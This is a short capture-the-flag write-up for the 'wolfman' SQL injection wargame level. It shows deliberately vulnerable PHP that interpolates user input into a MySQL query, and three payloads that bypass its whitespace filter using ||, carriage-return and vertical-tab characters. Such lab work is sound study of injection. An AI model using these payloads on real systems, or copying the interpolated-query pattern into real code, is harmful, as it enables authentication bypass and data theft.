```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```
BLACKLIST: White spaces

PAYLOAD 1: ?pw='||id='admin'%23
OUTPUT: select id from prob_wolfman where id='guest' and pw=''||id='admin'#'

PAYLOAD 2: ?pw='or%0Did='admin'--%0D-
OUTPUT:  select id from prob_wolfman where id='guest' and pw=''or id='admin'-- -'
(Carriage Return)

PAYLOAD 3: ?pw='or%0Bid='admin'--%0B-
OUTPUT: select id from prob_wolfman where id='guest' and pw=''orid='admin'---'
(Vertical Tab)

Wolfman Clear
